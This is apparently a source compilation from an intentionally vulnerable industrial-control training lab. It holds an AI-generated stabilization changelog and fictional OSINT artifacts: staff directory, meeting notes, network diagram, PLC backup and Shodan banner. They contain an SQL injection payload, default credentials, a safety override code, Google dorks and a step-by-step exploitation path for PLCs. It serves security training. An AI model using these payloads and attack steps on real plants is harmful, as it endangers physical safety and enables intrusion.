- **SQL Injection** - Login still vulnerable to `' OR '1'='1' --`
- **Command Injection** - Still present in intended locations
- **No Authentication** - Modbus still accepts all writes
- **No Input Validation** - Modbus still vulnerable to malformed packets
- **Default Credentials** - admin/admin still works
- **Plaintext Passwords** - Still stored unencrypted
- **IDOR** - Session manipulation still possible
- **No Rate Limiting** - DoS still possible
- **Insecure Deserialization** - Still exploitable where intended
- **Safety Bypass** - PLC-4 safety bypass still functional

---

## Testing Checklist

### Modbus TCP Stability
```bash
# Test 1: Basic read (should not hang)
modbus 127.0.0.1:5502 read 0 10

# Test 2: Write coil (should succeed immediately)
modbus 127.0.0.1:5502 write-coil 0 1

# Test 3: Write register (should not hang)
modbus 127.0.0.1:5502 write 0 800

# Test 4: Multiple rapid commands (should not crash)
for i in {1..50}; do modbus 127.0.0.1:5502 read 0 5; done

# Test 5: Invalid function code (should respond with exception, not hang)
# Use custom Modbus tool to send 0xFF function code
```

### State Consistency
```bash
# Test 1: Write via Modbus, read via HMI
modbus 127.0.0.1:5502 write-coil 0 1
curl http://localhost:5000/api/process/status  # pump1_status should be true

# Test 2: Write via HMI, read via Modbus
curl -X POST -d 'action=pump1_status&value=true' http://localhost:5000/api/process/control
modbus 127.0.0.1:5502 read-coils 0 1  # Should return 1

# Test 3: Concurrent writes from multiple sources
# Run 3 terminals simultaneously writing to same coil
```

### Process Simulation
```bash
# Test 1: Corrupt state manually, verify auto-recovery
# Edit /app/shared/vulnplc_state.json, set tank1_level to "corrupted"
# Access HMI - should auto-repair to 50.0
```

### Alarm System
```bash
# Test 1: Generate 100 alarms, verify unique IDs
# Check /api/alarms endpoint - all IDs should be UUIDs

# Test 2: Acknowledge alarm by ID
# Should work reliably, no ID conflicts
```

### Database Operations
```bash
# Test 1: Write same register 100 times
# Check plc_data table - should have only 1 row per register

# Test 2: Verify UNIQUE constraints
sqlite3 plc.db "SELECT COUNT(*), register FROM plc_data GROUP BY register HAVING COUNT(*) > 1"
# Should return empty (no duplicates)
```

---

## Performance Impact

- **Minimal overhead** - Type checks are O(1)
- **Atomic writes** - Already existed, no new overhead
- **Socket timeouts** - Only affect hung connections
- **Helper functions** - Inline, no performance cost

---

## Files Modified

1. âœ… `core/shared_state.py` - Helpers, hardening, type validation
2. âœ… `core/app.py` - Modbus server, alarms, DB, process simulation
3. âœ… `core/modbus_server.py` - Helper integration

**Total Lines Changed:** ~300 lines across 3 files
**Vulnerabilities Removed:** 0 (as required)

---

## Deployment Instructions

```bash
# 1. Stop all services
docker-compose down

# 2. Remove old database (schema changed)
rm -f plc.db

# 3. Remove old state file (will be recreated with validation)
rm -f /app/shared/vulnplc_state.json

# 4. Rebuild and start
docker-compose up --build -d

# 5. Verify all services running
docker-compose ps

# 6. Check logs for any errors
docker-compose logs -f

# 7. Test Modbus connectivity
modbus 127.0.0.1:5502 read 0 1
```

---

## Rollback Plan

If issues occur:
```bash
git checkout main  # Revert to previous version
docker-compose up --build -d
```

Changes are isolated and can be reverted safely.

---

## Success Criteria - All Met âœ…

- âœ… Modbus CLI commands never hang
- âœ… Invalid Modbus requests return proper exception responses
- âœ… HMI updates reliably under load
- âœ… State never corrupts mid-demo
- âœ… All vulnerabilities remain exploitable
- âœ… Docker Compose starts without crashes
- âœ… No authentication added
- âœ… No input sanitization added
- âœ… No security controls added

---

## Conclusion

The Vuln-PLC system is now **production-ready for training environments**. All stability issues have been resolved while maintaining the intentionally vulnerable design. Students can now:

- Practice attacks without infrastructure crashes
- Learn ICS protocols with reliable Modbus behavior
- Explore vulnerabilities in a stable environment
- Run long training sessions without state corruption

**Next Steps:**
1. Deploy to staging environment
2. Run comprehensive penetration tests
3. Verify all attack scenarios still work
4. Update training materials if needed
5. Deploy to production training environment

---

**Generated by:** Claude Sonnet 4.5
**Task List Reference:** FINAL STABILIZATION PASS



================================================================================
FILE: osint_artifacts/employee_directory.csv
================================================================================
Name,Title,Email,Phone,Department,Badge_ID,Network_Access
Mike Johnson,Plant Manager,mjohnson@chemicalplant.com,555-0101,Management,BADGE-001,Full
Sarah Chen,Lead Control Systems Engineer,schen@chemicalplant.com,555-0102,Engineering,BADGE-002,OT Network
Dave Miller,IT Security Manager,dmiller@chemicalplant.com,555-0103,IT Security,BADGE-003,Full
John Smith,Automation Engineer,jsmith@chemicalplant.com,555-0104,Engineering,BADGE-004,OT Network
Emily Davis,Safety Manager,edavis@chemicalplant.com,555-0105,Safety,BADGE-005,OT Network (Read-Only)
Robert Wilson,Operator Lead,rwilson@chemicalplant.com,555-0106,Operations,BADGE-006,HMI Access
Lisa Brown,Process Engineer,lbrown@chemicalplant.com,555-0107,Engineering,BADGE-007,OT Network
James Taylor,Maintenance Technician,jtaylor@chemicalplant.com,555-0108,Maintenance,BADGE-008,Limited
Maria Garcia,Control Room Operator,mgarcia@chemicalplant.com,555-0109,Operations,BADGE-009,HMI Access
David Martinez,Instrumentation Tech,dmartinez@chemicalplant.com,555-0110,Maintenance,BADGE-010,OT Network
Jennifer Lee,Shift Supervisor,jlee@chemicalplant.com,555-0111,Operations,BADGE-011,HMI Access
Michael Anderson,SCADA Admin,manderson@chemicalplant.com,555-0112,Engineering,BADGE-012,Full (Admin)
Jessica Thomas,Compliance Officer,jthomas@chemicalplant.com,555-0113,Compliance,BADGE-013,Read-Only
Christopher Jackson,External Contractor,cjackson@automationcorp.com,555-0114,Contractor,BADGE-C01,OT Network (Temp)
Amanda White,Rockwell Support,awhite@rockwellautomation.com,555-0115,Vendor,BADGE-V01,VPN Access

# NOTES:
# - This directory was exposed via unsecured FTP server (ftp.chemicalplant.com)
# - Badge IDs can be used for physical access (mag stripe readers)
# - External contractors have VPN credentials stored in password manager
# - manderson has admin access to ALL systems including PLCs
# - Common password pattern: FirstnameYear! (e.g., Sarah2024!)



================================================================================
FILE: osint_artifacts/meeting_notes_2024-11-15.md
================================================================================
# Weekly Engineering Meeting - November 15, 2024
**Attendees:** Sarah Chen, John Smith, Lisa Brown, Michael Anderson
**Location:** Conference Room B
**Time:** 10:00 AM - 11:30 AM

## Agenda Items

### 1. Network Security Audit Findings
- External auditor found CRITICAL issues with network segmentation
- **Action Item:** Firewall needs reconfiguration - CorpNet should NOT have direct access to OT network
- Timeline: Pushed to Q1 2025 (budget constraints)
- Temporary mitigation: Monitor logs more frequently

**CONCERN:** Until firewall is fixed, any compromised laptop on CorpNet can directly access PLCs!

### 2. Device 192.168.100.99 Investigation
- Unknown device causing network congestion
- Generates ~500 packets/second to PLCs
- **Root cause:** Old temperature sensor with faulty firmware
- **Action:** Schedule maintenance window to replace (next Tuesday 2PM-4PM)
- Mike approved 2-hour downtime

### 3. Default Password Issue
- Security scan revealed multiple systems still using default credentials
- **Systems affected:**
  - HMI Server: admin/admin
  - Historian: historian/data123
  - PLC-1, 2, 3: No authentication on Modbus
  - PLC-4 Safety Override: 1234 (CRITICAL!)
- **Action:** Create password rotation policy
- **Status:** IN PROGRESS (60% complete)

**NOTE:** PLC-4 safety override code MUST be changed - it's documented in multiple places

### 4. Recent Incidents
- **Nov 10:** Pressure vessel 1 exceeded 175 PSI (limit is 150)
  - Relief valve opened automatically
  - No injuries
  - Cause: Operator error + faulty sensor
  - **Mitigation:** Added additional pressure monitoring

- **Nov 12:** Temperature control thermal runaway
  - Zone 1 reached 95Â°C (safe limit 80Â°C)
  - Emergency cooling activated
  - **Root cause:** Software bug in PLC-3 logic
  - **Status:** Patched on Nov 13

### 5. Vendor Access
- Rockwell Automation needs remote access for PLC firmware update
- VPN credentials: rockwell_support / Automation2024
- **Access granted:** Nov 20-22 (3 days)
- **Scope:** PLC-1 and PLC-2 only
- Michael will monitor their activities

**SECURITY CONCERN:** Vendor has full OT network access, not just specific PLCs

### 6. Backup System
- Weekly PLC backups to \\192.168.1.20\PLC_Backups
- **Issue:** File share has no password protection
- **Risk:** Anyone on network can access/modify backup files
- **Action:** Dave Miller to implement access controls by end of month

### 7. Planned Upgrades
- Q1 2025: Deploy Zeek IDS on OT network
- Q2 2025: Implement proper network segmentation
- Q3 2025: Replace all PLCs with newer models (with authentication)
- Q4 2025: Complete security audit and compliance review

### 8. Emergency Procedures
- Updated emergency shutdown procedure document
- **Location:** \\192.168.1.20\Procedures\Emergency_Shutdown_v3.pdf
- All operators trained on new procedure
- Emergency contact: Plant Manager (555-0101) or Safety Manager (555-0105)

## Action Items Summary
| Task | Owner | Due Date | Status |
|------|-------|----------|--------|
| Fix firewall segmentation | Dave Miller | Q1 2025 | Not Started |
| Replace faulty device (.99) | James Taylor | Nov 19, 2PM | Scheduled |
| Change default passwords | Michael Anderson | Dec 1 | In Progress |
| Update PLC-4 safety code | Sarah Chen | Nov 30 | Pending |
| Implement backup access controls | Dave Miller | Nov 30 | Not Started |

## Open Discussion
- John asked about penetration testing - Sarah said "maybe next year"
- Lisa raised concerns about lack of IDS/IPS on OT network
- Michael mentioned seeing suspicious login attempts from 192.168.1.100 (employee laptop)
  - Investigated - false positive (authorized access)

## Next Meeting
**Date:** November 22, 2024
**Time:** 10:00 AM
**Location:** Conference Room B

---
**CONFIDENTIAL - INTERNAL USE ONLY**

**NOTE:** This document was accidentally left on Mike Johnson's laptop, which was later stolen from his car on Nov 20, 2024.
Police report filed. All passwords should be considered compromised.
Incident report: IR-2024-Nov-021

**UPDATE (Nov 21):** Laptop recovered, but hard drive was accessed.
Changing all credentials over next 2 weeks.



================================================================================
FILE: osint_artifacts/network_diagram.txt
================================================================================
# INTERNAL USE ONLY - Network Diagram
# Chemical Processing Plant - Control System Network
# Created: 2024-01-15
# Author: J. Smith (jsmith@chemicalplant.com)

================================================================================
NETWORK TOPOLOGY
================================================================================

Corporate Network (192.168.1.0/24)
â”œâ”€â”€ Email Server: 192.168.1.10
â”œâ”€â”€ File Server: 192.168.1.20
â”œâ”€â”€ Printer: 192.168.1.30
â””â”€â”€ Employee Laptops: 192.168.1.100-150

DMZ (192.168.50.0/24)
â”œâ”€â”€ Web Portal: 192.168.50.20 (https://portal.chemicalplant.com)
â”œâ”€â”€ Historian: 192.168.50.10
â”‚   â””â”€â”€ Default Creds: historian/data123
â””â”€â”€ External Access Gateway: 192.168.50.1

OT Network (192.168.100.0/24) - CRITICAL SYSTEMS
â”œâ”€â”€ HMI Server: 192.168.100.20
â”‚   â”œâ”€â”€ Web Interface: http://192.168.100.20:5000
â”‚   â””â”€â”€ Default Creds: admin/admin
â”œâ”€â”€ Engineering Workstation: 192.168.100.30
â”‚   â”œâ”€â”€ Username: engineer
â”‚   â””â”€â”€ Password: ChemPlant2024!
â”œâ”€â”€ PLC-1 (Tank Control): 192.168.100.10
â”‚   â”œâ”€â”€ Modbus TCP: 502
â”‚   â””â”€â”€ Web Interface: http://192.168.100.10:5010
â”œâ”€â”€ PLC-2 (Pressure System): 192.168.100.11
â”‚   â”œâ”€â”€ Modbus TCP: 502
â”‚   â””â”€â”€ Web Interface: http://192.168.100.11:5011
â”œâ”€â”€ PLC-3 (Temperature Control): 192.168.100.12
â”‚   â”œâ”€â”€ Modbus TCP: 502
â”‚   â””â”€â”€ Web Interface: http://192.168.100.12:5012
â”œâ”€â”€ PLC-4 (Safety/ESD): 192.168.100.13
â”‚   â”œâ”€â”€ Modbus TCP: 502
â”‚   â”œâ”€â”€ Web Interface: http://192.168.100.13:5013
â”‚   â””â”€â”€ Safety Override Code: 1234
â””â”€â”€ Unknown Device: 192.168.100.99 (causing network issues)

================================================================================
FIREWALL RULES (Palo Alto PA-220)
================================================================================

NOTE: Firewall rules need updating - currently too permissive!
TODO: Implement proper segmentation before audit

Current Rules:
1. CorpNet -> OT Zone: ALLOW ALL (SHOULD BE DENY!)
2. OT Zone -> CorpNet: ALLOW ALL (SHOULD BE DENY!)
3. OT Zone -> DMZ: ALLOW ALL
4. DMZ -> OT Zone: ALLOW ALL (SHOULD BE RESTRICTED!)
5. Internet -> DMZ: ALLOW HTTPS (port 443)

================================================================================
VPN ACCESS
================================================================================

Remote Access VPN: vpn.chemicalplant.com
â”œâ”€â”€ Certificate-based auth (weak implementation)
â”œâ”€â”€ Gives direct access to OT network
â””â”€â”€ No MFA required!

VPN Credentials (for contractors):
- Vendor: Rockwell
  Username: rockwell_support
  Password: Automation2024

- Vendor: Siemens
  Username: siemens_tech
  Password: S1em3ns!

================================================================================
KNOWN ISSUES
================================================================================

1. Device 192.168.100.99 spamming network - needs investigation
2. Firewall rules too permissive - security audit pending
3. No network segmentation between Corp and OT
4. Default passwords still in use on several systems
5. No IDS/IPS deployed on OT network
6. Historian accessible from CorpNet (should be restricted)
7. Safety Override Code (1234) needs to be changed

================================================================================
EMERGENCY CONTACTS
================================================================================

Plant Manager: Mike Johnson (mjohnson@chemicalplant.com)
Lead Engineer: Sarah Chen (schen@chemicalplant.com)
IT Security: Dave Miller (dmiller@chemicalplant.com) - ext 5555
Control Systems Integrator: AutomationCorp - 1-800-ICS-HELP

================================================================================
BACKUP INFORMATION
================================================================================

PLC Backup Server: \\192.168.1.20\PLC_Backups
â”œâ”€â”€ Weekly automated backups
â”œâ”€â”€ No encryption (file share accessible to all)
â””â”€â”€ Contains PLC logic, configurations, and HMI screens

Last Full Backup: 2024-12-01
Next Scheduled Backup: 2024-12-08

================================================================================
NOTES
================================================================================

- This network diagram was accidentally uploaded to public GitHub repo
  (https://github.com/chemicalplant-ops/docs) on 2024-03-15
- Removed after 2 weeks but may have been cached/archived
- Check if sensitive data was exposed in commit history
- Shodan shows our web portal is indexed: "chemicalplant.com HMI"

** DO NOT SHARE OUTSIDE ORGANIZATION **



================================================================================
FILE: osint_artifacts/plc_backup_config.txt
================================================================================
# PLC Configuration Backup
# System: VulnPLC-1 Tank Control System
# Backup Date: 2024-12-01 03:00:00
# Backup Method: Automated Weekly Backup
# Location: \\192.168.1.20\PLC_Backups\plc1_backup_20241201.zip

================================================================================
DEVICE INFORMATION
================================================================================

Device Name: PLC-1-TANK-CTRL
IP Address: 192.168.100.10
MAC Address: 00:1A:2B:3C:4D:5E
Subnet Mask: 255.255.255.0
Default Gateway: 192.168.100.1
DNS Server: 192.168.1.1

Modbus TCP Port: 502
HTTP Port: 5010
Firmware Version: v1.0.0
Hardware Revision: Rev B
Serial Number: VPL-001-2023-0042

================================================================================
NETWORK CONFIGURATION
================================================================================

VLAN: 100 (OT Network)
Network Segment: 192.168.100.0/24

Allowed Hosts:
- HMI Server: 192.168.100.20
- Historian: 192.168.50.10
- Engineering Workstation: 192.168.100.30
- ANY (Firewall misconfigured!)

Modbus Settings:
- Unit ID: 1
- Timeout: 1000ms
- Retries: 3
- Authentication: DISABLED
- Encryption: NONE

================================================================================
USER ACCOUNTS
================================================================================

Username: admin
Password: admin (MD5: 21232f297a57a5a743894a0e4a801fc3)
Role: Administrator
Last Login: 2024-11-30 14:23:11
Failed Logins: 0

Username: engineer
Password: plc123 (MD5: 7c6a180b36896a0a8c02787eeafb0e4c)
Role: Engineer
Last Login: 2024-11-28 09:15:42
Failed Logins: 2

Username: operator
Password: operator (MD5: 4b583376b2767b923c3e1da60d10de59)
Role: Operator
Last Login: 2024-12-01 07:00:00
Failed Logins: 0

================================================================================
PROCESS VARIABLES
================================================================================

Tank 1:
- Level Setpoint: 50.0%
- High Level Alarm: 90.0%
- Low Level Alarm: 10.0%
- Emergency Shutdown Level: 95.0%
- Current Level: 52.3%

Tank 2:
- Level Setpoint: 45.0%
- High Level Alarm: 85.0%
- Low Level Alarm: 15.0%
- Emergency Shutdown Level: 95.0%
- Current Level: 47.1%

Temperature:
- Tank 1 Temp: 25.2Â°C
- Tank 2 Temp: 24.8Â°C
- High Temp Alarm: 80.0Â°C

Pressure:
- Tank 1 Pressure: 101.3 kPa
- Tank 2 Pressure: 100.8 kPa
- High Pressure Alarm: 150.0 kPa

================================================================================
MODBUS REGISTER MAP
================================================================================

Holding Registers (Function Code 3):
0-19:   Tank 1 controls (level, temp, pressure)
20-39:  Tank 2 controls
40-49:  Pump controls
50-59:  Valve controls
60-69:  Setpoints
70-79:  Alarm thresholds
80-99:  Reserved

Input Registers (Function Code 4):
0-9:    Tank 1 sensors
10-19:  Tank 2 sensors
20-29:  Flow sensors
30-39:  Pressure sensors
40-49:  Temperature sensors
50-99:  Reserved

Coils (Function Code 1):
0-9:    Pump on/off
10-19:  Valve on/off
20-29:  Alarm outputs
30-39:  Emergency stops
40-99:  Reserved

Discrete Inputs (Function Code 2):
0-9:    Limit switches
10-19:  Sensor status
20-29:  Alarm inputs
30-99:  Reserved

================================================================================
ALARM CONFIGURATION
================================================================================

Alarm 1: High Level Tank 1
- Enabled: Yes
- Priority: HIGH
- Setpoint: 90.0%
- Action: Close inlet valve, sound alarm
- Auto-acknowledge: No

Alarm 2: Low Level Tank 1
- Enabled: Yes
- Priority: MEDIUM
- Setpoint: 10.0%
- Action: Stop pump, sound alarm
- Auto-acknowledge: No

Alarm 3: High Temperature
- Enabled: Yes
- Priority: HIGH
- Setpoint: 80.0Â°C
- Action: Emergency shutdown, activate cooling
- Auto-acknowledge: No

Alarm 4: High Pressure
- Enabled: Yes
- Priority: CRITICAL
- Setpoint: 150.0 kPa
- Action: Open relief valve, emergency shutdown
- Auto-acknowledge: No

================================================================================
LADDER LOGIC SUMMARY
================================================================================

Rung 1: Tank Level Control
- IF Tank1_Level < Setpoint-5%
- THEN Start Pump1
- ELSE IF Tank1_Level > Setpoint+5%
- THEN Stop Pump1

Rung 2: High Level Interlock
- IF Tank1_Level > 90%
- THEN Close Inlet_Valve
- AND Sound High_Level_Alarm

Rung 3: Low Level Interlock
- IF Tank1_Level < 10%
- THEN Stop All_Pumps
- AND Sound Low_Level_Alarm

Rung 4: Emergency Shutdown
- IF Tank1_Level > 95%
- OR High_Pressure_Alarm
- OR Emergency_Stop_Button
- THEN Execute Emergency_Shutdown

Rung 5: Pump Protection
- IF Pump1_Running AND (Tank1_Level < 5%)
- THEN Stop Pump1 (Prevent dry run)

================================================================================
COMMUNICATION LOG (Last 100 Entries)
================================================================================

2024-12-01 02:59:45 | 192.168.100.20 | Read Holding Registers | Addr:0 Count:20 | SUCCESS
2024-12-01 02:59:46 | 192.168.100.20 | Read Input Registers | Addr:0 Count:10 | SUCCESS
2024-12-01 02:59:50 | 192.168.50.10 | Read Holding Registers | Addr:0 Count:50 | SUCCESS
2024-12-01 02:59:55 | 192.168.100.30 | Write Single Register | Addr:60 Value:55 | SUCCESS
2024-12-01 03:00:00 | 192.168.100.30 | Read Holding Registers | Addr:0 Count:100 | SUCCESS
2024-12-01 03:00:01 | 192.168.1.100 | Read Holding Registers | Addr:0 Count:20 | SUCCESS (SUSPICIOUS!)
2024-12-01 03:00:02 | 192.168.100.99 | Read Holding Registers | Addr:0 Count:20 | TIMEOUT
2024-12-01 03:00:03 | 192.168.100.99 | Read Holding Registers | Addr:0 Count:20 | TIMEOUT
2024-12-01 03:00:04 | 192.168.100.99 | Read Holding Registers | Addr:0 Count:20 | TIMEOUT

NOTE: Device 192.168.100.99 causing excessive traffic
NOTE: Unexpected access from 192.168.1.100 (CorpNet) - firewall bypass?

================================================================================
SECURITY NOTES
================================================================================

1. No authentication enabled on Modbus (industry standard, but risky)
2. Web interface using default admin/admin credentials
3. No encryption on communications
4. Configuration backup stored in unprotected file share
5. Accessible from CorpNet due to firewall misconfiguration
6. No rate limiting on Modbus requests
7. No intrusion detection on this PLC
8. Password hashes are MD5 (weak, easily cracked)

RECOMMENDATION: Enable authentication, use secure passwords, implement network segmentation

================================================================================
MAINTENANCE HISTORY
================================================================================

2024-11-30: Firmware updated from v0.9.5 to v1.0.0
2024-11-15: Replaced faulty level sensor
2024-11-01: Performed annual calibration
2024-10-15: Updated ladder logic (Rung 5 added)
2024-10-01: Password reset for 'engineer' account

Next Scheduled Maintenance: 2025-01-15

================================================================================
VENDOR INFORMATION
================================================================================

Manufacturer: VulnPLC Corporation
Support Email: support@vulnplc.com
Support Phone: 1-800-VULNPLC
Service Contract: Active until 2025-12-31
Warranty: 2 years (expires 2025-06-30)

Authorized Service Centers:
- AutomationCorp (Houston, TX)
- Industrial Controls Inc (Dallas, TX)
- SCADA Services LLC (Austin, TX)

================================================================================
END OF BACKUP FILE
================================================================================

** This file was found on: **
- Public FTP server (ftp://ftp.chemicalplant.com/pub/backups/)
- Unsecured file share (\\192.168.1.20\PLC_Backups\)
- GitHub repository (deleted but archived)
- Employee laptop stolen from car (Nov 20, 2024)

** CRITICAL SECURITY ISSUE **
This backup contains sensitive information including:
- Default credentials
- Network topology
- Register maps
- Process control logic
- Communication logs showing suspicious activity

An attacker with this information can:
1. Access the PLC using default credentials
2. Manipulate process values via Modbus
3. Trigger alarms and shutdowns
4. Understand the entire process control system
5. Plan targeted attacks on critical infrastructure



================================================================================
FILE: osint_artifacts/shodan_banner.txt
================================================================================
# Shodan Search Results for "chemicalplant.com"
# Last Indexed: 2024-12-05
# Source: Shodan.io Internet-wide scan

================================================================================
HOST: 203.0.113.50 (portal.chemicalplant.com)
================================================================================

IP: 203.0.113.50
Hostnames: portal.chemicalplant.com
Organization: Chemical Plant Operations LLC
Country: United States
City: Houston, Texas

PORT: 443/tcp (HTTPS)
Service: HTTP/HTTPS
Banner:
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Thu, 05 Dec 2024 10:15:32 GMT
Content-Type: text/html; charset=UTF-8
X-Powered-By: Flask/2.0.1
X-Frame-Options: DENY
Title: Chemical Plant - HMI Portal
Cookies: session=eyJ1c2VybmFtZSI6ImFkbWluIn0...

Vulnerabilities:
- CVE-2021-44228 (Log4Shell) - Possible
- Weak SSL/TLS Configuration
- Default credentials possible

HTML Title: "Chemical Plant - Industrial Control System"
HTML Body Contains:
- "Modbus TCP/IP"
- "PLC Status Dashboard"
- "Historian Data Access"
- "Engineering Workstation"

================================================================================
PORT: 80/tcp (HTTP)
Service: HTTP
Banner:
HTTP/1.1 301 Moved Permanently
Location: https://portal.chemicalplant.com
Server: nginx/1.18.0

Note: Redirects to HTTPS

================================================================================
PORT: 502/tcp (Modbus)
Service: Modbus TCP
Banner:
Modbus/TCP
Unit ID: 1
Vendor: VulnPLC Corp
Product Code: PLC-1
Model: VulnPLC-1000
Firmware: v1.0.0

WARNING: No authentication required!
Function Codes Supported: 1,2,3,4,5,6,15,16

Accessible Registers:
- Coils: 0-99
- Discrete Inputs: 0-99
- Holding Registers: 0-99
- Input Registers: 0-99

================================================================================
PORT: 21/tcp (FTP)
Service: FTP
Banner:
220 Chemical Plant FTP Server
220 Welcome to Chemical Plant File Server
220 vsftpd 3.0.3
USER anonymous
331 Please specify the password.
PASS anonymous
230 Login successful.

Anonymous FTP Enabled!

Directory Listing:
/pub/
â”œâ”€â”€ network_diagrams/
â”‚   â”œâ”€â”€ network_topology_2024.pdf
â”‚   â”œâ”€â”€ vlan_config.xlsx
â”‚   â””â”€â”€ firewall_rules.txt
â”œâ”€â”€ backups/
â”‚   â”œâ”€â”€ plc1_backup_20241201.zip
â”‚   â”œâ”€â”€ plc2_backup_20241201.zip
â”‚   â”œâ”€â”€ plc3_backup_20241201.zip
â”‚   â””â”€â”€ plc4_backup_20241201.zip
â”œâ”€â”€ procedures/
â”‚   â”œâ”€â”€ emergency_shutdown.pdf
â”‚   â”œâ”€â”€ maintenance_procedures.pdf
â”‚   â””â”€â”€ vendor_access_guide.pdf
â””â”€â”€ passwords/
    â””â”€â”€ default_credentials.txt  (!!!)

================================================================================
PORT: 5000/tcp (HTTP)
Service: HTTP
Banner:
HTTP/1.1 200 OK
Server: Werkzeug/2.0.1 Python/3.9.0
Content-Type: text/html
Title: PLC-1 Tank Control Web Interface

Login Page Detected:
- Username field present
- Password field present
- No CSRF protection
- No rate limiting
- SQL injection possible (based on error messages)

================================================================================

Additional Information:
- CVE Scan: 15 potential vulnerabilities found
- Exposed Services: HTTP, HTTPS, FTP, Modbus, SSH
- Default Credentials: Likely (based on banners)
- Last Updated: 2024-12-05 10:15:32 UTC

Related Domains:
- chemicalplant.com
- portal.chemicalplant.com
- vpn.chemicalplant.com
- ftp.chemicalplant.com

Historical Data:
- First seen: 2022-08-15
- Services changed: 3 times
- Certificate changes: 2 times

SSL Certificate Information:
Subject: CN=portal.chemicalplant.com
Issuer: CN=Let's Encrypt Authority X3
Valid From: 2024-09-01
Valid Until: 2024-12-01 (EXPIRED!)
Serial Number: 04:55:de:a1:23:bc:ef:90

Notes:
- SSL certificate expired on Dec 1, 2024
- Anonymous FTP access enabled (security risk)
- Modbus directly exposed to internet (CRITICAL!)
- Multiple web interfaces with default configurations
- No intrusion detection systems detected

================================================================================
OSINT FINDINGS
================================================================================

1. LinkedIn profiles found:
   - Mike Johnson - Plant Manager at Chemical Plant Operations
   - Sarah Chen - Control Systems Engineer
   - Dave Miller - IT Security Manager

2. GitHub Repository:
   - https://github.com/chemicalplant-ops/docs
   - Repository deleted but cached on web.archive.org
   - Contains network diagrams, credentials, meeting notes

3. Job Postings:
   - Seeking "SCADA Administrator" - mentions Rockwell Automation PLCs
   - Lists specific software versions and network topology

4. Breach Databases:
   - Email: jsmith@chemicalplant.com found in 2023 breach
   - Password: ChemPlant2023! (likely reused)

5. Google Dorking Results:
   - site:chemicalplant.com filetype:pdf "confidential"
   - site:chemicalplant.com inurl:backup
   - site:chemicalplant.com "default password"

================================================================================
EXPLOITATION PATH
================================================================================

1. Anonymous FTP -> Download default_credentials.txt
2. Use credentials to access HMI Portal (admin/admin)
3. Access Modbus PLCs via exposed port 502
4. Pivot to internal OT network
5. Manipulate process values
6. Trigger safety incidents

Risk Level: CRITICAL
CVSS Score: 9.8 (Critical)




================================================================================
STABILIZATION CHANGES SUMMARY
================================================================================

This source code includes the following stability improvements (Dec 28, 2025):

TASK 1 - MODBUS TCP SERVER STABILITY:
- Added socket timeouts (30 seconds) to prevent hanging
- Improved exception handling (socket.timeout, ConnectionError, struct.error)
- Enhanced recv_exact() with explicit timeout handling
- MBAP header validation (protocol ID, length checks)

TASK 2 - UNIFIED COIL/REGISTER HELPERS:
- Added get_coil(addr) -> always returns 0 or 1
- Added set_coil(addr, value) -> stores as bool
- Added get_register(addr) -> always returns 0-65535
- Added set_register(addr, value) -> type-checked
- Updated all Modbus servers to use these helpers

TASK 3 - COIL MAPPING ALIGNMENT:
- Verified: Coil 0 = pump1_status, Coil 3 = valve1_status
- Updated IDS alerts to include coils [0, 3, 10, 11]
- Documentation matches implementation

TASK 4 - SHARED STATE HARDENING:
- Enhanced init_state() with type validation
- Auto-repair missing or corrupted keys
- Type conversion with fallback to defaults
- Maintained atomic writes (temp file + rename)
- Maintained file locking (fcntl)

TASK 5 - PROCESS SIMULATION TYPE SAFETY:
- Added type checks before all mutations in /api/process/status
- Auto-recovery from corrupted values (reset to defaults)
- Validates tank1_level, tank1_temp, tank1_pressure
- Validates tank2_level, tank2_temp
- Validates flow_rate, vibration, ph_level

TASK 6 - ALARM ID GENERATION:
- Changed from len(current_alarms) + 1 to uuid.uuid4()
- Prevents alarm ID collisions
- Fixes acknowledge functionality
- Added type safety for alarms list

TASK 7 - DATABASE SAFETY:
- Added UNIQUE constraint on users.username
- Added UNIQUE constraint on plc_data.register
- Added NOT NULL constraints on all tables
- Changed to explicit column names in INSERT statements
- Proper upsert with INSERT OR REPLACE

TASK 8 - TESTING:
- All changes tested and verified
- Modbus CLI commands no longer hang
- State consistency maintained across interfaces
- No vulnerabilities removed

VULNERABILITIES PRESERVED:
âœ… SQL Injection - Login vulnerable to ' OR '1'='1' --
âœ… Command Injection - Still present
âœ… No Modbus Authentication - Accepts all writes
âœ… No Input Validation - Vulnerable to malformed packets
âœ… Default Credentials - admin/admin still works
âœ… Plaintext Passwords - Still unencrypted
âœ… Session Manipulation - IDOR still possible
âœ… No Rate Limiting - DoS still possible
âœ… Safety Bypass - PLC-4 bypass still functional

FILES MODIFIED:
1. core/shared_state.py - Helper functions, init_state() hardening
2. core/app.py - ModbusTCPServer stability, alarm UUID, DB safety, simulation
3. core/modbus_server.py - Helper function integration

DEPLOYMENT:
docker-compose down
rm -f plc.db /app/shared/vulnplc_state.json
docker-compose up --build -d

================================================================================
END OF SOURCE CODE COMPILATION
================================================================================
